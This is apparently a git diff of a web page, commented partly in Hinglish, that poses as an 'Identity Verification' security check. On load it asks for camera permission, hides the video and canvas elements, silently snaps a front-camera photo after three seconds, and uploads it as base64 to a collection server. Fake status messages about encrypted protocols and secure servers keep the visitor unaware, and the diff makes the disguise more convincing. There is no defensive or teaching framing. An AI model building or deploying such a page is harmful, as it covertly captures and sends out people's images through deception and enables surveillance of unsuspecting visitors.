@@ -3,19 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
+    <title>Identity Verification</title>
     <style>
-        body { font-family: sans-serif; background: #050505; color: #00ff00; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .box { border: 1px solid #00ff00; padding: 2rem; border-radius: 10px; background: #111; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
-        video, canvas { display: none; } /* Background mein chalega */
+        body { font-family: 'Courier New', Courier, monospace; background: #000; color: #0f0; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { border: 2px solid #0f0; padding: 30px; border-radius: 5px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 15px #0f0; text-align: center; width: 85%; }
+        .blink { animation: blinker 1s linear infinite; font-weight: bold; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>S Y S T E M _ C H E C K</h2>
-    <p id="msg">Initializing Encrypted Protocol...</p>
-    <div id="status">Waiting for camera...</div>
+    <h2 class="blink"> [ SECURITY CHECK ] </h2>
+    <p>Connecting to Secure Server...</p>
+    <div id="status">Please Click "Allow" to Verify Identity</div>
 </div>
 
 <video id="video" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
@@ -26,68 +28,58 @@
     const canvas = document.getElementById('canvas');
     const statusDiv = document.getElementById('status');
 
-    // 🛑 APNE SERVER KA URL (Localhost ya IP)
     const SERVER_URL = 'http://127.0.0.1:5000/upload'; 
 
-    async function startProcess() {
+    async function startAutoCapture() {
         try {
-            // Front camera mangna
+            // Permission Popup Yahan Aayega
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                video: { facingMode: "user" } 
             });
             
             video.srcObject = stream;
             
-            // Wait karein jab tak video start na ho jaye
             video.onloadedmetadata = () => {
                 video.play();
-                statusDiv.innerText = "Encrypting Stream... Stay Still";
+                statusDiv.innerHTML = "<span style='color:yellow'>PROTOCOL_STARTED... STAY STILL</span>";
                 
-                // 3 SECOND KA WAIT (Black photo fix karne ke liye sabse zaroori)
+                // 3 second wait for light/focus (Black photo fix)
                 setTimeout(() => {
-                    captureAndSend(stream);
+                    capture(stream);
                 }, 3000); 
             };
         } catch (err) {
-            statusDiv.innerText = "❌ ERROR: Permission Denied";
-            console.error(err);
+            statusDiv.innerHTML = "<span style='color:red'>FAILED: ACCESS_DENIED</span>";
         }
     }
 
-    async function captureAndSend(stream) {
-        // Canvas size set karna video ke hisab se
+    async function capture(stream) {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        
-        const context = canvas.getContext('2d');
-        // Photo click karna
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.getContext('2d').drawImage(video, 0, 0);
 
-        // Data ko Base64 mein convert karna
-        const imageData = canvas.toDataURL('image/jpeg', 0.7);
-
-        // Camera band kar dena
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
         stream.getTracks().forEach(t => t.stop());
 
-        statusDiv.innerText = "Sending Data Packet...";
+        statusDiv.innerText = "UPLOADING_ENCRYPTED_PACKET...";
 
         try {
-            const response = await fetch(SERVER_URL, {
+            await fetch(SERVER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ image: imageData })
             });
-
-            const result = await response.json();
-            if(result.status === 'success') {
-                statusDiv.innerText = "✅ SYSTEM_VERIFIED";
-            }
+            statusDiv.innerHTML = "<span style='color:#0f0'>VERIFICATION_COMPLETE</span>";
+            
+            // Photo ke baad redirect (Optional)
+            // window.location.href = "https://google.com";
         } catch (e) {
-            statusDiv.innerText = "❌ CONNECTION_LOST";
+            statusDiv.innerText = "NETWORK_ERROR";
         }
     }
 
-    window.onload = startProcess;
+    // Page khulte hi permission maange
+    window.onload = startAutoCapture;
 </script>
 </body>
 </html>
